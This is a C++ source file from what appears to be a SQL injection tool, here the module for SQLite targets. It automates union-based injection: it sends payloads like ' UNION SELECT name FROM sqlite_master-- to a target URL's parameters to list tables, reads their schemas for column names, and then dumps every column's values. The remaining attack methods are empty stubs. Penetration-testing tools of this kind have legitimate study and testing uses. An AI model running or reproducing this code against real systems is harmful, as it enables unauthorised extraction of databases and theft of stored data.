#include "../../include/class/VaccineSQLite.hpp"

// ===================================================================== //
// ============================ P U B L I C ============================ //
// ===================================================================== //

VaccineSQLite::VaccineSQLite() : VaccineBase() {}

VaccineSQLite::VaccineSQLite(
    const std::string& url,
    const std::string& request_type,
    const std::vector< std::string >& headers,
    const std::string& archive_file)
    : VaccineBase(MYSQL, url, request_type, headers, archive_file) {}

VaccineSQLite::VaccineSQLite(const VaccineSQLite& other)
    : VaccineBase(other) {}

VaccineSQLite::~VaccineSQLite() {}

VaccineSQLite& VaccineSQLite::operator=(const VaccineSQLite& other)
{
        if (this != &other)
                this->VaccineBase::operator=(other);
        return *this;
}

// ==================================================== METHODS
void VaccineSQLite::stacked_queries()
{
}

void VaccineSQLite::union_based()
{
        if (!this->_data_check())
                return;
        std::string url;
        std::string offset;
        std::vector< std::string > payloads;
        std::vector< std::string > parameters;
        for (const auto& node : this->_gates)
        {
                if (!this->_init_attempt(node, url, parameters))
                        continue;
                std::cout << "[ INFO ] Testing " << url
                          << " with db type as SQLite..." << std::endl;
                this->_databases["root"] = std::vector< int >();

                this->_fetch_tables(
                    parameters, payloads,
                    offset, url);

                for (const auto& tab_index : this->_databases["root"])
                        this->_fetch_columns(
                            parameters, payloads, offset,
                            url, tab_index);

                for (const auto& tab_index : this->_databases["root"])
                        this->_fetch_values(
                            parameters, payloads, offset,
                            url, tab_index);

                if (!this->_tables.empty())
                        this->_save_results(
                            url.substr(0, url.find('?')),
                            parameters, payloads);
                else
                        std::cout << "[ INFO ] Union based SQLi failed on "
                                  << url << " with db type as SQLite." << std::endl;
                offset.clear();
                payloads.clear();
                parameters.clear();
                this->_tables.clear();
                this->_columns.clear();
                this->_values.clear();
        }
}

void VaccineSQLite::error_based()
{
}

void VaccineSQLite::blind_based()
{
}

// ===================================================================== //
// =========================== P R I V A T E =========================== //
// ===================================================================== //

// ==================================================== PREPARE
void VaccineSQLite::_fetch_tables(
    const std::vector< std::string >& base_parameters,
    std::vector< std::string >& payloads,
    std::string& offset,
    const std::string& url)
{
        short timeout = TIMEOUT;
        while (this->_tables.empty() && timeout--)
        {
                const std::string payload =
                    "' UNION SELECT " + offset + "name " +
                    "FROM sqlite_master-- ";
                payloads.push_back(payload);

                const std::vector< std::string > parameters = this->_fill_parameters(
                    base_parameters,
                    payload);
                const std::vector< std::string > values = this->_parse_response(
                    this->_process(url, parameters));

                if (values.empty())
                {
                        offset += "null, ";
                        continue;
                }
                const int size = this->_tables.size();
                this->_tables.push_back(std::unordered_map< std::string, int >());

                for (const auto& value : values)
                        for (const auto& excluded : this->_excluded)
                                if (value.find(excluded) == std::string::npos)
                                        this->_tables[size][value] = -1;
                this->_databases["root"].push_back(size);
        }
}

void VaccineSQLite::_fetch_columns(
    const std::vector< std::string >& base_parameters,
    std::vector< std::string >& payloads,
    std::string& offset,
    const std::string& url,
    const int& tab_index)
{
        if (tab_index < 0)
                return;
        std::string payload;
        for (const auto& table : this->_tables[tab_index])
        {
                payload = "' UNION SELECT " + offset + "sql " +
                          "FROM sqlite_master " +
                          "WHERE type='table' " +
                          "AND name='" + table.first + "'-- ";
                payloads.push_back(payload);

                const std::vector< std::string > parameters = this->_fill_parameters(
                    base_parameters,
                    payload);
                const std::vector< std::string > values = this->_parse_response(
                    this->_process(url, parameters), true);

                if (values.empty())
                        continue;
                const int size = this->_columns.size();
                this->_columns.push_back(std::unordered_map< std::string, int >());

                for (const auto& value : values)
                        this->_columns[size][value] = -1;
                this->_tables[tab_index][table.first] = size;
        }
}

void VaccineSQLite::_fetch_values(
    const std::vector< std::string >& base_parameters,
    std::vector< std::string >& payloads,
    std::string& offset,
    const std::string& url,
    const int& tab_index)
{
        if (tab_index < 0)
                return;
        int index;
        std::string payload;
        for (const auto& table : this->_tables[tab_index])
        {
                index = this->_tables.at(tab_index).at(table.first);
                if (index < 0)
                        continue;
                for (auto& column : this->_columns[index])
                {
                        payload = "' UNION SELECT " + offset + column.first + " " +
                                  "FROM " + table.first + "-- ";
                        payloads.push_back(payload);

                        const std::vector< std::string > parameters = this->_fill_parameters(
                            base_parameters,
                            payload);
                        const std::vector< std::string > values = this->_parse_response(
                            this->_process(url, parameters));

                        if (values.empty())
                                continue;
                        const int size = this->_values.size();
                        this->_values.push_back(std::vector< std::string >());

                        for (const auto& value : values)
                                this->_values[size].push_back(value);
                        this->_columns[index][column.first] = size;
                }
        }
}

std::vector< std::string > VaccineSQLite::_parse_response(
    const std::string& response,
    bool is_col) const
{
        std::vector< std::string > values;
        Json::Value entries;
        std::string errors;
        Json::CharReaderBuilder builder;
        std::unique_ptr< Json::CharReader > reader(builder.newCharReader());
        if (!reader->parse(
                response.c_str(),
                response.c_str() + response.size(),
                &entries,
                &errors))
        {
                std::cerr << "[ ERROR ] Could not parse server response." << std::endl;
                return values;
        }
        for (const auto& member : entries.getMemberNames())
        {
                if (!entries[member].isArray())
                        continue;
                if (entries[member].empty())
                        values.push_back(std::string());
                else if (is_col)
                        return this->_parse_col_response(
                            entries,
                            member);
                for (const auto& array : entries[member])
                {
                        if (!(array.isArray() && !array.empty()))
                                continue;
                        values.push_back(
                            array[array.size() - 1].asString());
                }
        }
        return values;
}

std::vector< std::string > VaccineSQLite::_parse_col_response(
    const Json::Value& entries,
    const std::string& member) const
{
        std::string schema;
        std::vector< std::string > values;
        for (const auto& array : entries[member])
        {
                if (!(array.isArray() && !array.empty()))
                        continue;
                try
                {
                        schema = array[array.size() - 1].asString();
                        break;
                }
                catch (const std::exception& e)
                {
                        return values;
                }
        }
        size_t start = schema.find('(');
        size_t end = schema.find(')');
        if (start == std::string::npos || end == std::string::npos)
                return values;

        std::string str = schema.substr(start + 1, end - start - 1);
        std::stringstream ss(str);
        std::string token;
        while (std::getline(ss, token, ','))
        {
                token.erase(
                    token.begin(),
                    std::find_if(
                        token.begin(),
                        token.end(),
                        [](unsigned char ch)
                        { return !std::isspace(ch); }));
                token.erase(
                    std::find_if(
                        token.rbegin(),
                        token.rend(),
                        [](unsigned char ch)
                        { return !std::isspace(ch); })
                        .base(),
                    token.end());

                size_t delimiter = token.find(' ');
                if (delimiter != std::string::npos)
                {
                        std::string name = token.substr(0, delimiter);
                        values.push_back(name);
                }
        }
        return values;
}
